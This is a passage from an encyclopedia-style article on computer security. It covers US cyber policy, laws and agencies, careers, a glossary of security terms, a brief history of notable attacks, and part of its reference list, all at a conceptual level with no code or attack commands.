]
 In this policy, the US says it will: Protect the country by keeping networks, systems, functions, and data safe; Promote American wealth by building a strong digital economy and encouraging strong domestic innovation; Peace and safety should be kept by making it easier for the US to stop people from using computer tools for bad things, working with friends and partners to do this; and increase the United States' impact around the world to support the main ideas behind an open, safe, reliable, and compatible Internet.
[
247
]


The new U.S. cyber strategy
[
248
]
 seeks to allay some of those concerns by promoting responsible behavior in 
cyberspace
, urging nations to adhere to a set of norms, both through international law and voluntary standards. It also calls for specific measures to harden U.S. government networks from attacks, like the June 2015 intrusion into the 
U.S. Office of Personnel Management
 (OPM), which compromised the records of about 4.2 million current and former government employees. And the strategy calls for the U.S. to continue to name and shame bad cyber actors, calling them out publicly for attacks when possible, along with the use of economic sanctions and diplomatic pressure.
[
249
]




Legislation
[
edit
]


The 1986 
18 U.S.C.
 
§ 1030
, the 
Computer Fraud and Abuse Act
 is the key legislation. It prohibits unauthorized access or damage of 
protected computers
 as defined in 
18 U.S.C.
 
§ 1030(e)(2)
. Although various other measures have been proposed
[
250
]
[
251
]
 – none have succeeded.

In 2013, 
executive order
 
13636
 
Improving Critical Infrastructure Cybersecurity
 was signed, which prompted the creation of the 
NIST Cybersecurity Framework
.

In response to the 
Colonial Pipeline ransomware attack
[
252
]
 President 
Joe Biden
 signed Executive Order 14028
[
253
]
 on May 12, 2021, to increase software security standards for sales to the government, tighten detection and security on existing systems, improve information sharing and training, establish a Cyber Safety Review Board, and improve incident response.



Standardized government testing services
[
edit
]


The 
General Services Administration
 (GSA) has
[
when?
]
 standardized the 
penetration test
 service as a pre-vetted support service, to rapidly address potential vulnerabilities, and stop adversaries before they impact US federal, state and local governments. These services are commonly referred to as Highly Adaptive Cybersecurity Services (HACS).



Further information: 
Penetration test § Standardized government penetration test services


Agencies
[
edit
]


The 
Department of Homeland Security
 has a dedicated division responsible for the response system, 
risk management
 program and requirements for cybersecurity in the United States called the 
National Cyber Security Division
.
[
254
]
[
255
]
 The division is home to US-CERT operations and the National Cyber Alert System.
[
255
]
 The National Cybersecurity and Communications Integration Center brings together government organizations responsible for protecting computer networks and networked infrastructure.
[
256
]


The third priority of the FBI is to: "Protect the United States against cyber-based attacks and high-technology crimes",
[
257
]
 and they, along with the 
National White Collar Crime Center
 (NW3C), and the 
Bureau of Justice Assistance
 (BJA) are part of the multi-agency task force, The 
Internet Crime Complaint Center
, also known as IC3.
[
258
]


In addition to its own specific duties, the FBI participates alongside non-profit organizations such as 
InfraGard
.
[
259
]
[
260
]


The 
Computer Crime and Intellectual Property Section
 (CCIPS) operates in the 
United States Department of Justice Criminal Division
. The CCIPS is in charge of investigating 
computer crime
 and 
intellectual property
 crime and is specialized in the search and seizure of 
digital evidence
 in computers and 
networks
.
[
261
]
 In 2017, CCIPS published A Framework for a Vulnerability Disclosure Program for Online Systems to help organizations "clearly describe authorized vulnerability disclosure and discovery conduct, thereby substantially reducing the likelihood that such described activities will result in a civil or criminal violation of law under the Computer Fraud and Abuse Act (18 U.S.C. § 1030)."
[
262
]


The 
United States Cyber Command
, also known as USCYBERCOM, "has the mission to direct, synchronize, and coordinate cyberspace planning and operations to defend and advance national interests in collaboration with domestic and international partners."
[
263
]
 It has no role in the protection of civilian networks.
[
264
]
[
265
]


The U.S. 
Federal Communications Commission
's role in cybersecurity is to strengthen the protection of critical communications infrastructure, to assist in maintaining the reliability of networks during disasters, to aid in swift recovery after, and to ensure that first responders have access to effective communications services.
[
266
]


The 
Food and Drug Administration
 has issued guidance for medical devices,
[
267
]
 and the 
National Highway Traffic Safety Administration
[
268
]
 is concerned with automotive cybersecurity. After being criticized by the 
Government Accountability Office
,
[
269
]
 and following successful attacks on airports and claimed attacks on airplanes, the 
Federal Aviation Administration
 has devoted funding to securing systems on board the planes of private manufacturers, and the 
Aircraft Communications Addressing and Reporting System
.
[
270
]
 Concerns have also been raised about the future 
Next Generation Air Transportation System
.
[
271
]


The US Department of Defense (DoD) issued DoD Directive 8570 in 2004, supplemented by DoD Directive 8140, requiring all DoD employees and all DoD contract personnel involved in information assurance roles and activities to earn and maintain various industry Information Technology (IT) certifications in an effort to ensure that all DoD personnel involved in network infrastructure defense have minimum levels of IT industry recognized knowledge, skills and abilities (KSA). Andersson and Reimers (2019) report these certifications range from CompTIA's A+ and Security+ through the ICS2.org's CISSP, etc.
[
272
]




Computer emergency readiness team
[
edit
]


Computer emergency response team
 is a name given to expert groups that handle computer security incidents. In the US, two distinct organizations exist, although they do work closely together.



US-CERT
: part of the 
National Cyber Security Division
 of the 
United States Department of Homeland Security
.
[
273
]


CERT/CC
: created by the 
Defense Advanced Research Projects Agency
 (DARPA) and run by the 
Software Engineering Institute
 (SEI).


U.S. NRC, 10 CFR 73.54 Cybersecurity
[
edit
]


In the context of 
U.S. nuclear power plants
, the 
U.S. Nuclear Regulatory Commission (NRC)
 outlines cybersecurity requirements under 
10 CFR Part 73
, specifically in §73.54.
[
274
]




NEI 08-09: Cybersecurity Plan for Nuclear Power Plants
[
edit
]


The 
Nuclear Energy Institute
's NEI 08-09 document, 
Cyber Security Plan for Nuclear Power Reactors
,
[
275
]
  outlines a comprehensive framework for 
cybersecurity
 in the 
nuclear power industry
. Drafted with input from the 
U.S. NRC
, this guideline is instrumental in aiding 
licensees
 to comply with the 
Code of Federal Regulations (CFR)
, which mandates robust protection of digital computers and equipment and communications systems at nuclear power plants against cyber threats.
[
276
]




Modern warfare
[
edit
]


Main article: 
Cyberwarfare


There is growing concern that cyberspace will become the next theater of warfare. As Mark Clayton from 
The Christian Science Monitor
 wrote in a 2015 article titled "The New Cyber Arms Race":



In the future, wars will not just be fought by soldiers with guns or with planes that drop bombs. They will also be fought with the click of a mouse a half a world away that unleashes carefully weaponized computer programs that disrupt or destroy critical industries like utilities, transportation, communications, and energy. Such attacks could also disable military networks that control the movement of troops, the path of jet fighters, the command and control of warships.
[
277
]


This has led to new terms such as 
cyberwarfare
 and 
cyberterrorism
. The 
United States Cyber Command
 was created in 2009
[
278
]
 and many other countries 
have similar forces
.

There are a few critical voices that question whether cybersecurity is as significant a threat as it is made out to be.
[
279
]
[
280
]
[
281
]




Careers
[
edit
]


Cybersecurity is a fast-growing field of 
IT
 concerned with reducing organizations' risk of hack or data breaches.
[
282
]
 According to research from the Enterprise Strategy Group, 46% of organizations say that they have a "problematic shortage" of cybersecurity skills in 2016, up from 28% in 2015.
[
283
]
 Commercial, government and non-governmental organizations all employ cybersecurity professionals. The fastest increases in demand for cybersecurity workers are in industries managing increasing volumes of consumer data such as finance, health care, and retail.
[
284
]
 However, the use of the term 
cybersecurity
 is more prevalent in government job descriptions.
[
285
]


Typical cybersecurity job titles and descriptions include:
[
286
]




Security analyst
[
edit
]


Analyzes and assesses vulnerabilities in the infrastructure (software, hardware, networks), investigates using available tools and countermeasures to remedy the detected vulnerabilities and recommends solutions and best practices. Analyzes and assesses damage to the data/infrastructure as a result of security incidents, examines available recovery tools and processes, and recommends solutions. Tests for compliance with security policies and procedures. May assist in the creation, implementation, or management of security solutions.


Security engineer
[
edit
]


Performs security monitoring, security and data/logs analysis, and forensic analysis, to detect security incidents, and mount the incident response. Investigates and utilizes new technologies and processes to enhance security capabilities and implement improvements. May also review code or perform other 
security engineering
 methodologies.


Security architect
[
edit
]


Designs a security system or major components of a security system, and may head a security design team building a new security system.
[
287
]


Chief Information Security Officer (CISO)
[
edit
]


A high-level management position responsible for the entire information security division/staff. The position may include hands-on technical work.
[
288
]


Chief Security Officer (CSO)
[
edit
]


A high-level management position responsible for the entire security division/staff. A newer position is now deemed needed as security risks grow.


Data Protection Officer (DPO)
[
edit
]


A DPO is tasked with monitoring compliance with data protection laws (such as 
GDPR
), data protection policies, awareness-raising, training, and audits.
[
289
]


Security Consultant/Specialist/Intelligence
[
edit
]


Broad titles that encompass any one or all of the other roles or titles tasked with protecting computers, networks, software, data or information systems against viruses, worms, spyware, malware, intrusion detection, unauthorized access, denial-of-service attacks, and an ever-increasing list of attacks by hackers acting as individuals or as part of organized crime or foreign governments.


Student programs are also available for people interested in beginning a career in cybersecurity.
[
290
]
[
291
]
 Meanwhile, a flexible and effective option for information security professionals of all experience levels to keep studying is online security training, including webcasts.
[
292
]
[
293
]
 A wide range of certified courses are also available.
[
294
]


In the United Kingdom, a nationwide set of cybersecurity forums, known as the 
U.K Cyber Security Forum
, were established supported by the Government's cybersecurity strategy
[
295
]
 in order to encourage start-ups and innovation and to address the skills gap
[
296
]
 identified by the 
U.K Government
.

In Singapore, the 
Cyber Security Agency
 has issued a Singapore Operational Technology (OT) Cybersecurity Competency Framework (OTCCF). The framework defines emerging cybersecurity roles in Operational Technology. The OTCCF was endorsed by the 
Infocomm Media Development Authority
 (IMDA). It outlines the different OT cybersecurity job positions as well as the technical skills and core competencies necessary. It also depicts the many career paths available, including vertical and lateral advancement opportunities.
[
297
]




Terminology
[
edit
]


The following terms used with regards to computer security are explained below:



Access 
authorization
 restricts access to a computer to a group of users through the use of 
authentication
 systems. These systems can protect either the whole computer, such as through an interactive 
login
 screen, or individual services, such as a 
FTP
 server. There are many methods for identifying and authenticating users, such as 
passwords
, 
identification cards
, 
smart cards
, and 
biometric
 systems.


Anti-virus software
 consists of computer programs that attempt to identify, thwart, and eliminate 
computer viruses
 and other malicious software (
malware
).


Applications
 are 
executable code
, so general corporate practice is to 
restrict or block users the power
 to install them; to install them only when there is a demonstrated need (e.g. software needed to perform assignments); to install only those which are known to be reputable (preferably with access 
to the computer code
 used to create the application,- and to reduce the 
attack surface
 by installing as few as possible. They are typically run with 
least privilege
, with a robust process in place to identify, test and install any released 
security patches
 or updates for them.

For example, programs can be installed into an individual user's account, which limits the program's potential access, as well as being a means control which users have specific exceptions to policy.  In 
Linux
, 
FreeBSD
, 
OpenBSD
, and other 
Unix
-like operating systems there is an option to further restrict an application using 
chroot
 or other means of 
restricting the application to its own 'sandbox'
.  For example. Linux provides 
namespaces
, and 
Cgroups
 to further restrict the access of an application to system resources.


Generalized security frameworks such as 
SELinux
 or 
AppArmor
 help administrators control access.


Java and other languages which compile to 
Java byte code
 and run in the 
Java virtual machine
 can have their access to other applications controlled at the virtual machine level.


Some software can be run in 
software containers
 which can even provide their own set of system libraries, limiting the software's, or anyone controlling it, access to the server's versions of the libraries.


Authentication
 techniques can be used to ensure that communication end-points are who they say they are.


Automated theorem proving
 and other verification tools can be used to enable critical algorithms and code used in secure systems to be mathematically proven to meet their specifications.


Backups
 are one or more copies kept of important computer files. Typically, multiple copies will be kept at different locations so that if a copy is stolen or damaged, other copies will still exist.


Capability
 and 
access control list
 techniques can be used to ensure privilege separation and mandatory access control. 
Capabilities vs. ACLs
 discusses their use.


Chain of trust
 techniques can be used to attempt to ensure that all software loaded has been certified as authentic by the system's designers.


Confidentiality
 is the nondisclosure of information except to another authorized person.
[
298
]


Cryptographic
 techniques can be used to defend data in transit between systems, reducing the probability that the data exchange between systems can be intercepted or modified.


Cyber attribution
,  is an 
attribution
 of 
cybercrime
, i.e., finding who perpetrated a 
cyberattack
.


Cyberwarfare
 is an Internet-based conflict that involves politically motivated attacks on information and information systems. Such attacks can, for example, disable official websites and networks, disrupt or disable essential services, steal or alter classified data, and cripple financial systems.


Data integrity
 is the accuracy and consistency of stored data, indicated by an absence of any alteration in data between two updates of a data record.
[
299
]


Cryptographic
 techniques involve transforming information, scrambling it, so it becomes unreadable during transmission. The intended recipient can unscramble the message; ideally, eavesdroppers cannot.


Encryption
 is used to protect the confidentiality of a message. 
Cryptographically
 secure 
ciphers
 are designed to make any practical attempt of 
breaking
 them infeasible. 
Symmetric-key
 ciphers are suitable for bulk encryption using 
shared keys
, and 
public-key encryption
 using 
digital certificates
 can provide a practical solution for the problem of securely communicating when no key is shared in advance.


Endpoint security
 software aids networks in preventing malware infection and data theft at network entry points made vulnerable by the prevalence of potentially infected devices such as laptops, mobile devices, and USB drives.
[
300
]


Firewalls
 serve as a gatekeeper system between networks, allowing only traffic that matches defined rules. They often include detailed 
logging
, and may include 
intrusion detection
 and 
intrusion prevention
 features. They are near-universal between company 
local area networks
 and the Internet, but can also be used internally to impose traffic rules between networks if 
network segmentation
 is configured.


A 
hacker
 is someone who seeks to breach defenses and exploit weaknesses in a computer system or network.


Honey pots
 are computers that are intentionally left vulnerable to attack by crackers. They can be used to catch crackers and to identify their techniques.


Intrusion-detection systems
 are devices or software applications that monitor networks or systems for malicious activity or policy violations.


A 
microkernel
 is an approach to operating system design which has only the near-minimum amount of code running at the most privileged level – and runs other elements of the operating system such as device drivers, protocol stacks and file systems, in the safer, less privileged 
user space
.


Pinging
. The standard 
ping application
 can be used to test if an IP address is in use. If it is, attackers may then try a 
port scan
 to detect which services are exposed.


A 
port scan
 is used to probe an IP address for 
open ports
 to identify accessible network services and applications.


A 
key logger
 is spyware that silently captures and stores each keystroke that a user types on the computer's keyboard.


Social engineering
 is the use of deception to manipulate individuals to breach security.


Logic bombs
 is a type of malware added to a legitimate program that lies dormant until it is triggered by a specific event.


Zero trust security
 means that no one is trusted by default from inside or outside the network, and verification is required from everyone trying to gain access to resources on the network.


History
[
edit
]


Since the 
Internet
's arrival and with the digital transformation initiated in recent years, the notion of cybersecurity has become a familiar subject in both our professional and personal lives. Cybersecurity and cyber threats have been consistently present for the last 60 years of technological change. In the 1970s and 1980s, computer security was mainly limited to 
academia
 until the conception of the Internet, where, with increased connectivity, computer viruses and network intrusions began to take off. After the spread of viruses in the 1990s, the 2000s marked the institutionalization of organized attacks such as 
distributed denial of service
.
[
301
]
 This led to the formalization of cybersecurity as a professional discipline.
[
302
]


The 
April 1967 session
 organized by 
Willis Ware
 at the 
Spring Joint Computer Conference
, and the later publication of the 
Ware Report
, were foundational moments in the history of the field of computer security.
[
303
]
 Ware's work straddled the intersection of material, cultural, political, and social concerns.
[
303
]


A 1977 
NIST
 publication
[
304
]
 introduced the 
CIA triad
 of confidentiality, integrity, and availability as a clear and simple way to describe key security goals.
[
305
]
 While still relevant, many more elaborate frameworks have since been proposed.
[
306
]
[
307
]


However, in the 1970s and 1980s, there were no grave computer threats because computers and the internet were still developing, and security threats were easily identifiable. More often, threats came from malicious insiders who gained unauthorized access to sensitive documents and files. Although malware and network breaches existed during the early years, they did not use them for financial gain. By the second half of the 1970s, established computer firms like 
IBM
 started offering commercial access control systems and computer security software products.
[
308
]


One of the earliest examples of an attack on a computer network was the 
computer worm
 
Creeper
 written by Bob Thomas at 
BBN
, which propagated through the 
ARPANET
 in 1971.
[
309
]
 The program was purely experimental in nature and carried no malicious payload. A later program, 
Reaper
, was created by 
Ray Tomlinson
 in 1972 and used to destroy Creeper.
[
citation needed
]


Between September 1986 and June 1987, a group of German hackers performed the first documented case of cyber espionage.
[
310
]
 The group hacked into American defense contractors, universities, and military base networks and sold gathered information to the Soviet KGB. The group was led by 
Markus Hess
, who was arrested on 29 June 1987. He was convicted of espionage (along with two co-conspirators) on 15 Feb 1990.

In 1988, one of the first computer worms, called the 
Morris worm
, was distributed via the Internet. It gained significant mainstream media attention.
[
311
]


In 1993, 
Netscape
 started developing the protocol 
SSL
, shortly after the National Center for Supercomputing Applications (NCSA) launched Mosaic 1.0, the first web browser, in 1993.
[
citation needed
]
[
312
]
 Netscape had SSL version 1.0 ready in 1994, but it was never released to the public due to many serious security vulnerabilities. These weaknesses included 
replay attacks
 and a vulnerability that allowed hackers to alter unencrypted communications sent by users. However, in February 1995, Netscape launched Version 2.0.
[
313
]


The 
National Security Agency
 (NSA) is responsible for the 
protection
 of U.S. information systems and also for collecting foreign intelligence.
[
314
]
 The agency analyzes commonly used software and system configurations to find security flaws, which it can use for offensive purposes against competitors of the United States.
[
315
]


NSA contractors created and sold 
click-and-shoot
 attack tools to US agencies and close allies, but eventually, the tools made their way to foreign adversaries.
[
citation needed
]
 In 2016, NSAs own hacking tools were hacked, and they have been used by Russia and North Korea.
[
citation needed
]
 NSA's employees and contractors have been recruited at high salaries by adversaries, anxious to compete in 
cyberwarfare
.
[
citation needed
]
 In 2007, the United States and 
Israel
 began exploiting security flaws in the 
Microsoft Windows
 operating system to attack and damage equipment used in Iran to refine nuclear materials. Iran responded by heavily investing in their own cyberwarfare capability, which it began using against the United States.
[
315
]




Notable scholars
[
edit
]




Ross J. Anderson


Annie Anton


Adam Back


Daniel J. Bernstein


Matt Blaze


Stefan Brands


L. Jean Camp


Lorrie Cranor


Dorothy E. Denning


Peter J. Denning


Cynthia Dwork


Chuck Easttom


Deborah Estrin


Joan Feigenbaum


Ian Goldberg


Shafi Goldwasser


Lawrence A. Gordon


Peter Gutmann


Paul Kocher


Monica S. Lam


Butler Lampson


Brian LaMacchia


Susan Landau


Carl Landwehr


Kevin Mitnick


Peter G. Neumann


Susan Nycum


Paul C. van Oorschot


Roger R. Schell


Bruce Schneier


Dawn Song


Gene Spafford


Salvatore J. Stolfo


Willis Ware


Moti Yung


See also
[
edit
]




Attack tree
 – Conceptual diagrams showing how an asset, or target, might be attacked


Bicycle attack
 – Method of discovering password length


CAPTCHA
 – Test to determine whether a user is human


Center for Internet Security
 – Nonprofit organization focused on cybersecurity


Cloud computing security
 – Methods used to protect cloud based assets


Comparison of antivirus software


Content Disarm & Reconstruction
 – Policy-based removal of  components


Content Security Policy
 – Computer security standard to prevent cross-site scripting and related attacks


Countermeasure (computer)
 – Process to reduce a security threat


Cyber insurance
 – Information technology risk insurance


Cyber self-defense
 – Self-defense against cyberattack


Cyberbiosecurity
 – Emerging field of computer security


Cybersecurity information technology list


Dancing pigs
 – Users' disregard for IT security


Data security
 – Protection of digital data


Defense strategy (computing)
 – Concept to reduce computer security risks


Fault tolerance
 – Resilience of systems to component failures or errors


Hardware security
 – Security architecture implemented in hardware


Human–computer interaction (security)
 – Academic discipline studying the relationship between computer systems and their users
Pages displaying short descriptions of redirect targets


Identity management
 – Technical and Policy systems to give users appropriate access


Identity-based security
 – Access control by authenticated ID


Information security awareness
 – part of information security that focuses on raising consciousness regarding potential risks of the rapidly evolving forms of information and the accompanying threats
Pages displaying wikidata descriptions as a fallback


Internet privacy
 – Right or mandate of personal privacy concerning the internet


Internet safety
 – Being aware of safety and security risks on the Internet


Internet security
 – Branch of computer security


IT risk
 – Any risk related to information technology


IT security standards
 – Technology standards and techniques
Pages displaying short descriptions of redirect targets


Cyber kill chain
 – Process of carrying out a cyberattack


List of computer security certifications


List of cyber warfare forces


Open security
 – Open source approach to computer security


Outline of computer security
 – Overview of and topical guide to computer security


OWASP
 – Computer security organization


Physical information security
 – Common ground of physical and information security


Privacy software
 – Layer to protect users' privacy


Security through obscurity
 – Reliance on design or implementation secrecy for security


Separation of protection and security
 – Mechanism v. policy design choice


Software-defined perimeter
 – Approach to computer security from the US Defense Information Systems Agency


References
[
edit
]






^
 
Schatz, Daniel; Bashroush, Rabih; Wall, Julie (2017). 
"Towards a More Representative Definition of Cyber Security"
. 
Journal of Digital Forensics, Security and Law
. 
12
 (2). 
ISSN
 
1558-7215
.




^
 
Computer security
 at the 
Encyclopædia Britannica




^
 
Tate, Nick (7 May 2013). 
"Reliance spells end of road for ICT amateurs"
. 
The Australian
.




^
 
Kianpour, Mazaher; Kowalski, Stewart; Øverby, Harald (2021). 
"Systematically Understanding Cybersecurity Economics: A Survey"
. 
Sustainability
. 
13
 (24): 13677. 
doi
:
10.3390/su132413677
. 
hdl
:
11250/2978306
. 
ISSN
 
2071-1050
.




^
 
Stevens, Tim (11 June 2018). 
"Global Cybersecurity: New Directions in Theory and Methods"
 
(PDF)
. 
Politics and Governance
. 
6
 (2): 1–4. 
doi
:
10.17645/pag.v6i2.1569
. 
Archived
 
(PDF)
 from the original on 4 September 2019.




^
 
"About the CVE Program"
. 
www.cve.org
. Retrieved 
12 April
 2023
.




^
 
Zlatanov, Nikola (3 December 2015). 
Computer Security and Mobile Security Challenges
. Tech Security Conference At: San Francisco, CA.




^
 
"Ghidra"
. 
nsa.gov
. 1 August 2018. Archived from 
the original
 on 15 August 2020
. Retrieved 
17 August
 2020
.




^
 
Larabel, Michael (28 December 2017). 
"Syzbot: Google Continuously Fuzzing The Linux Kernel"
. 
www.phoronix.com/
. Retrieved 
25 March
 2021
.




^ 
a
 
b
 
c
 
"Cyber attacks on SMBs: Current Stats and How to Prevent Them"
. 
crowdstrike.com
. Retrieved 
30 November
 2023
.




^ 
a
 
b
 
"Cyber security breaches survey 2023"
. 
GOV.UK
. Retrieved 
30 November
 2023
.




^ 
a
 
b
 
"How cyber attacks work"
. 
www.ncsc.gov.uk
. Retrieved 
30 November
 2023
.




^
 
"What is a backdoor attack? Definition and prevention | NordVPN"
. 
nordvpn.com
. 30 November 2023
. Retrieved 
3 January
 2024
.




^ 
a
 
b
 
"What is a backdoor attack?"
. 
McAfee
. 4 December 2023
. Retrieved 
4 December
 2023
.




^ 
a
 
b
 
c
 
"Denial of Service (DoS) guidance"
. 
www.ncsc.gov.uk
. Retrieved 
4 December
 2023
.




^
 
"Computer Security"
. 
www.interelectronix.com
. Retrieved 
30 November
 2023
.




^ 
a
 
b
 
"What Is a DMA Attack? Analysis & Mitigation"
. 
Kroll
. Retrieved 
4 December
 2023
.




^ 
a
 
b
 
"What Are Eavesdropping Attacks?"
. 
Fortinet
. Retrieved 
5 December
 2023
.




^
 
York, Dan (1 January 2010), York, Dan (ed.), 
"Chapter 3 – Eavesdropping and Modification"
, 
Seven Deadliest Unified Communications Attacks
, Boston: Syngress, pp. 41–69, 
ISBN
 
978-1-59749-547-9
, retrieved 
5 December
 2023




^
 
"What Are Eavesdropping Attacks & How To Prevent Them"
. 
Verizon Enterprise
. Retrieved 
5 December
 2023
.




^ 
a
 
b
 
c
 
d
 
e
 
f
 
"What is Malware? | IBM"
. 
www.ibm.com
. 14 April 2022
. Retrieved 
6 December
 2023
.




^
 
Bendovschi, Andreea (2015). 
"Cyber-Attacks – Trends, Patterns and Security Countermeasures"
. 
Procedia Economics and Finance
. 
28
: 24–31. 
doi
:
10.1016/S2212-5671(15)01077-1
.




^
 
"What is malware?"
. 
McAfee
. Retrieved 
30 November
 2023
.




^ 
a
 
b
 


"What is a man-in-the-middle attack and how can I protect my organization?"
. 
verizon.com
.




^
 
"Multi-Vector Attacks Demand Multi-Vector Protection"
. 
MSSP Alert
. 24 July 2017.




^
 
Millman, Renee (15 December 2017). 
"New polymorphic malware evades three-quarters of AV scanners"
. 
SC Magazine UK
.




^ 
a
 
b
 
c
 
Tounsi, Wiem (15 May 2019), Tounsi, Wiem (ed.), 
"What is Cyber Threat Intelligence and How is it Evolving?"
, 
Cyber-Vigilance and Digital Trust
 (1 ed.), Wiley, pp. 1–49, 
doi
:
10.1002/9781119618393.ch1
, 
ISBN
 
978-1-78630-448-3
, 
S2CID
 
187294508
, retrieved 
6 December
 2023




^
 
"Identifying Phishing Attempts"
. Case. Archived from 
the original
 on 13 September 2015
. Retrieved 
4 July
 2016
.




^
 
"Protect yourself from phishing – Microsoft Support"
. 
support.microsoft.com
. Retrieved 
6 December
 2023
.




^
 
Lazarus, Ari (23 February 2018). 
"Phishers send fake invoices"
. 
Consumer Information
. Retrieved 
17 February
 2020
.




^
 
"Email Security"
. 
Trellix
. 17 May 2022. Archived from 
the original
 on 22 May 2022
. Retrieved 
24 October
 2022
.




^ 
a
 
b
 
c
 
d
 
"What is Privilege Escalation? – CrowdStrike"
. 
crowdstrike.com
. Retrieved 
7 December
 2023
.




^
 
Arcos Sergio. 
"Social Engineering"
 
(PDF)
. 
upc.edu
. 
Archived
 
(PDF)
 from the original on 3 December 2013
. Retrieved 
16 April
 2019
.




^
 
Scannell, Kara (24 February 2016). 
"CEO email scam costs companies $2bn"
. 
Financial Times
. No. 25 February 2016. Archived from 
the original
 on 23 June 2016
. Retrieved 
7 May
 2016
.




^
 
"Bucks leak tax info of players, employees as result of email scam"
. Associated Press. 20 May 2016. 
Archived
 from the original on 20 May 2016
. Retrieved 
20 May
 2016
.




^
 
"What is Spoofing? – Definition from Techopedia"
. 
techopedia.com
. 
Archived
 from the original on 30 June 2016
. Retrieved 
16 January
 2022
.




^
 
Butterfield, Andrew; Ngondi, Gerard Ekembe, eds. (21 January 2016). 
"spoofing"
. 
A Dictionary of Computer Science
. Oxford University Press. 
doi
:
10.1093/acref/9780199688975.001.0001
. 
ISBN
 
978-0199688975
. Retrieved 
8 October
 2017
.




^
 
Marcel, Sébastien; Nixon, Mark; Li, Stan, eds. (2014). 
Handbook of Biometric Anti-Spoofing: Trusted Biometrics under Spoofing Attacks
. Advances in Computer Vision and Pattern Recognition. London: Springer. 
doi
:
10.1007/978-1-4471-6524-8
. 
ISBN
 
978-1447165248
. 
ISSN
 
2191-6594
. 
LCCN
 
2014942635
. 
S2CID
 
27594864
.




^
 
"80 to 0 in Under 5 Seconds: Falsifying a Medical Patient's Vitals"
. 
www.trellix.com
. Retrieved 
9 February
 2023
.




^
 
Gallagher, Sean (14 May 2014). 
"Photos of an NSA "upgrade" factory show Cisco router getting implant"
. 
Ars Technica
. 
Archived
 from the original on 4 August 2014
. Retrieved 
3 August
 2014
.




^ 
a
 
b
 
Intelligence, Microsoft Threat (11 November 2021). 
"HTML smuggling surges: Highly evasive loader technique increasingly used in banking malware, targeted attacks"
. 
Microsoft Security Blog
. Retrieved 
7 December
 2023
.




^
 
"Obfuscated Files or Information: HTML Smuggling, Sub-technique T1027.006 – Enterprise | MITRE ATT&CK®"
. 
attack.mitre.org
. Retrieved 
22 February
 2023
.




^
 
Lim, Joo S.; Chang, Shanton; Maynard, Sean; Ahmad, Atif (2009). 
"Exploring the Relationship between Organizational Culture and Information Security Culture"
. 
Proceedings of the 7th Australian Information Security Management Conference
. Perth. Security Research Institute (SRI), Edith Cowan University: 1st to 3rd December 2009. 
doi
:
10.4225/75/57B4065130DEF
.




^
 
Reimers, Karl; Andersson, David (2017). 
Post-secondary Education Network Security: the End User Challenge and Evolving Threats
. ICERI2017 Proceedings. Vol. 1. IATED. pp. 1787–1796. 
doi
:
10.21125/iceri.2017.0554
. 
ISBN
 
978-84-697-6957-7
. 
ISSN
 
2340-1095
.




^
 
Verizon Data Breach Investigations Report 2020
 
(PDF)
. 
verizon.com
 (Report). 
Archived
 
(PDF)
 from the original on 19 May 2020
. Retrieved 
17 September
 2021
.




^ 
a
 
b
 
c
 
Schlienger, Thomas; Teufel, Stephanie (2003). "Information security culture-from analysis to change". 
South African Computer Journal
. 
31
: 46–52. 
hdl
:
10520/EJC27949
.




^
 
Internet Security Glossary
. 
doi
:
10.17487/RFC2828
. 
RFC
 
2828
.




^
 
"CNSS Instruction No. 4009"
 
(PDF)
. 26 April 2010. Archived from 
the original
 
(PDF)
 on 27 February 2012.




^
 
"InfosecToday Glossary"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 20 November 2014.




^
 
"Cyber security design principles"
. 
www.ncsc.gov.uk
. Retrieved 
11 December
 2023
.




^ 
a
 
b
 
"How the NCSC thinks about security architecture"
. 
www.ncsc.gov.uk
. Retrieved 
18 December
 2023
.




^
 
"Secure System Architecture and Design"
. 
UK Cyber Security Council
. 2024
. Retrieved 
4 January
 2024
.




^
 
"security architecture – Glossary | CSRC"
. 
csrc.nist.gov
. Retrieved 
18 December
 2023
.




^
 
Jannsen, Cory. 
"Security Architecture"
. 
Techopedia
. Janalta Interactive Inc. 
Archived
 from the original on 3 October 2014
. Retrieved 
9 October
 2014
.




^ 
a
 
b
 
Oppliger, Rolf (1 May 1997). 
"Internet security: firewalls and beyond"
. 
Communications of the ACM
. 
40
 (5): 92–102. 
doi
:
10.1145/253769.253802
. 
ISSN
 
0001-0782
.




^
 
"How to Increase Cybersecurity Awareness"
. 
ISACA
. Retrieved 
25 February
 2023
.




^
 
Woodie, Alex (9 May 2016). 
"Why ONI May Be Our Best Hope for Cyber Security Now"
. 
Archived
 from the original on 20 August 2016
. Retrieved 
13 July
 2016
.




^
 
Walkowski, Debbie (9 July 2019). 
"What Is The CIA Triad?"
. 
F5 Labs
. Retrieved 
25 February
 2020
.




^
 
"Knowing Value of Data Assets is Crucial to Cybersecurity Risk Management | SecurityWeek.Com"
. 
www.securityweek.com
. 3 December 2018
. Retrieved 
25 February
 2020
.




^
 
Foreman, Park (2009). 
Vulnerability Management
. Boca Raton, Fla.: Auerbach Publications. p. 1. 
ISBN
 
978-1-4398-0150-5
.




^
 
Johnson, A. (2018). 
CCNA Cybersecurity Operations Companion Guide
. Cisco Press. 
ISBN
 
978-0135166246
.




^
 
Calder, Alan; Williams, Geraint (2014). 
PCI DSS: A Pocket Guide
 (3rd ed.). IT Governance Limited. 
ISBN
 
978-1849285544
. 
network vulnerability scans at least quarterly and after any significant change in the network




^
 
Harrison, J. (2003). 
Formal verification at Intel
. 18th Annual IEEE Symposium of Logic in Computer Science, 2003. Proceedings. pp. 45–54. 
doi
:
10.1109/LICS.2003.1210044
. 
ISBN
 
978-0769518848
. 
S2CID
 
44585546
.




^
 
Umrigar, Zerksis D.; Pitchumani, Vijay (1983). 
Formal verification of a real-time hardware design
. Proceeding DAC '83 Proceedings of the 20th Design Automation Conference. IEEE Press. pp. 221–227. 
ISBN
 
978-0818600265
.




^
 
"Abstract Formal Specification of the seL4/ARMv6 API"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 21 May 2015
. Retrieved 
19 May
 2015
.




^
 
Baumann, Christoph; Beckert, Bernhard; Blasum, Holger; Bormer, Thorsten. 
Ingredients of Operating System Correctness? Lessons Learned in the Formal Verification of PikeOS
 
(PDF)
. Embedded World Conference, Nuremberg, Germany. Archived from 
the original
 
(PDF)
 on 19 July 2011.




^
 
Ganssle, Jack. 
"Getting it Right"
. Archived from 
the original
 on 4 May 2013.




^
 
"Everything you need for a career as a SOC analyst"
. 
www.cybersecurityjobsite.com
. Retrieved 
19 December
 2023
.




^
 
"Turn on 2-step verification (2SV)"
. 
